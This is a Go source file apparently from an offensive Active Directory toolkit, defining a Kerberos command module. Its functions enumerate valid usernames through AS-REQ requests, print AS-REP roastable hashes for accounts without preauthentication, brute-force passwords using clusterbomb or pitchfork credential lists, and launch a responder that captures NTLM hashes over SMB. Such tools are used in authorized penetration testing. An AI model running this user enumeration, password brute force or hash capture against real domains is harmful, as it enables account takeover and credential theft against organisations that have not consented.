package optkrb5

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"sync"
	"syscall"

	"github.com/5amu/goad/cmd/goad/cli/optsmb"
	"github.com/5amu/goad/internal/printer"
	"github.com/5amu/goad/internal/utils"
	"github.com/5amu/goad/pkg/responder"
	"github.com/5amu/goad/pkg/smb"
)

type Options struct {
	Targets struct {
		TARGETS []string `description:"Provide target IP/FQDN/FILE"`
	} `positional-args:"yes"`

	Connection struct {
		Username string `short:"u" description:"Provide username (or FILE)"`
		Password string `short:"p" description:"Provide password (or FILE)"`
		Domain   string `short:"d" long:"domain" description:"Provide domain"`
	} `group:"Connection Options" description:"Connection Options"`

	Mode struct {
		UserEnum  bool `long:"user-enum" description:"Enumerate valid usernames via kerberos"`
		Responder bool `long:"responder" description:"Launch a responder (testing)"`
	} `group:"Attack Mode"`

	BruteforceStrategy struct {
		ClusterBomb bool `long:"clusterbomb" description:"payload sets in clusterbomb mode (default)"`
		Pitchfork   bool `long:"pitchfork" description:"payload sets in pitchfork mode"`
	} `group:"Bruteforce Strategy"`

	targets        []string
	target2SMBInfo map[string]*smb.SMBFingerprint
	printMutex     sync.Mutex
	credentials    []utils.Credential
}

func (o *Options) getFunction() func(string) {
	if o.Mode.UserEnum {
		return o.userenum
	}
	return o.bruteforce
}

func (o *Options) Run() {
	if o.Mode.Responder {
		o.intercept()
		return
	}

	o.targets = utils.ExtractTargets(o.Targets.TARGETS)
	o.target2SMBInfo = optsmb.GatherSMBInfoToMap(o.targets, optsmb.DefaultPort)
	var f func(string) = o.getFunction()

	var strategy utils.Strategy = utils.Clusterbomb
	if o.BruteforceStrategy.Pitchfork {
		strategy = utils.Pitchfork
	}
	o.credentials = utils.NewCredentialsDispacher(
		o.Connection.Username,
		o.Connection.Password,
		"",
		strategy,
	)

	var wg sync.WaitGroup
	for target := range o.target2SMBInfo {
		wg.Add(1)
		go func(t string) {
			f(t)
			wg.Done()
		}(target)
	}
	wg.Wait()
}

func (o *Options) userenum(target string) {
	prt := printer.NewPrinter("KRB5", target, o.target2SMBInfo[target].NetBIOSComputerName, 88)
	defer prt.PrintStored(&o.printMutex)

	client, err := NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	for _, u := range o.credentials {
		if tgs, err := client.GetAsReqTgt(u.Username); err != nil {
			_, ok := err.(*ErrorRequiresPreauth)
			if ok {
				prt.StoreSuccess(u.StringWithDomain(o.Connection.Domain), "Requires Preauth")
			} else {
				prt.StoreFailure(u.StringWithDomain(o.Connection.Domain), "Does Not Exist")
			}
		} else {
			hash := tgs.Hash
			prt.StoreSuccess(u.StringWithDomain(o.Connection.Domain), "No Preauth")
			prt.Store(hash)
		}
	}
}

func (o *Options) bruteforce(target string) {
	prt := printer.NewPrinter("KRB5", target, o.target2SMBInfo[target].NetBIOSComputerName, 88)
	defer prt.PrintStored(&o.printMutex)

	client, err := NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	for _, u := range o.credentials {
		if ok, _ := client.TestLogin(u.Username, u.Password); ok {
			prt.StoreSuccess(u.StringWithDomain(o.Connection.Domain))
		} else {
			prt.StoreFailure(u.StringWithDomain(o.Connection.Domain))
		}
	}
}

func (o *Options) intercept() {
	resChan := make(chan *responder.NTLMResult)
	p := &responder.Producer{
		Results: resChan,
	}

	var modules map[responder.NTLMSource]func(context.Context) error = make(map[responder.NTLMSource]func(context.Context) error)
	var mod2port map[responder.NTLMSource]int = make(map[responder.NTLMSource]int)
	modules[responder.SMB] = p.GatherSMBHashes
	mod2port[responder.SMB] = 445

	go func() {
		for r := range resChan {
			o.printMutex.Lock()
			switch r.GatheredFrom {
			case responder.SMB:
				printer.NewPrinter("KRB5", r.Target, r.User, mod2port[responder.SMB]).Print(r.String())
			}
			o.printMutex.Unlock()
		}
	}()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	errC := make(chan error)
	go func() {
		for err := range errC {
			o.printMutex.Lock()
			printer.NewPrinter("KRB5", "RESPONDER", "ERROR", 0).PrintFailure(err.Error())
			o.printMutex.Unlock()
		}
	}()

	prt := printer.NewPrinter("KRB5", "RESPONDER", "MODULES", 0)
	o.printMutex.Lock()
	for mod, runner := range modules {
		prt.SetPort(mod2port[mod])
		prt.PrintInfo(fmt.Sprintf("Starting module: %s", mod))
		go func(f func(context.Context) error) {
			if err := f(ctx); err != nil {
				errC <- err
			}
		}(runner)
	}
	o.printMutex.Unlock()

	sigchan := make(chan os.Signal, 16)
	signal.Notify(sigchan, os.Interrupt, syscall.SIGTERM)
	<-sigchan
}
